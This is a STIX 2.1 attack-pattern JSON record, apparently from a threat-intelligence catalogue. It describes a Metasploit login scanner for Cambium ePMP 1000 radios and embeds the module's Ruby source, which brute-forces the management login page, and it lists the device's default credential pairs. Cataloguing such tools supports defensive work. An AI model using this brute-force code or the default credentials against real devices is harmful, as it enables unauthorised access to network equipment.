{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--01ff0039-1969-4774-9b78-e7b744ec787d",
    "created": "2024-08-14T16:29:17.903746Z",
    "modified": "2024-08-14T16:29:17.903751Z",
    "name": "Cambium ePMP 1000 Login Scanner",
    "description": " This module scans for Cambium ePMP 1000 management login portal(s), and attempts to identify valid credentials. Default login credentials are - admin/admin, installer/installer, home/home and readonly/readonly. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/epmp1000_web_login.rb",
            "external_id": "epmp1000_web_login.rb"
        },
        {
            "source_name": "reference",
            "url": "http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::EPMP\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Cambium ePMP 1000 Login Scanner',\n      'Description' => %{\n        This module scans for Cambium ePMP 1000 management login portal(s), and\n        attempts to identify valid credentials. Default login credentials are -\n        admin/admin, installer/installer, home/home and readonly/readonly.\n      },\n      'Author' =>\n        [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'\n        ],\n      'References' =>\n        [\n          ['URL', 'http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/']\n        ],\n      'License'        => MSF_LICENSE\n     )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.\n        OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),\n        OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'admin'])\n      ], self.class\n    )\n  end\n\n  def run_host(ip)\n    unless is_app_epmp1000?\n      return\n    end\n  end\n\n  #\n  # Brute-force the login page\n  #\n\n  def do_login(epmp_ver)\n    if epmp_ver < '3.4.1' # <3.4.1 uses login_1\n      each_user_pass do |user, pass|\n        login_1(user, pass, epmp_ver)\n      end\n    else\n      each_user_pass do |user, pass|\n        login_2(user, pass, epmp_ver)\n      end\n    end\n  end\nend\n"
}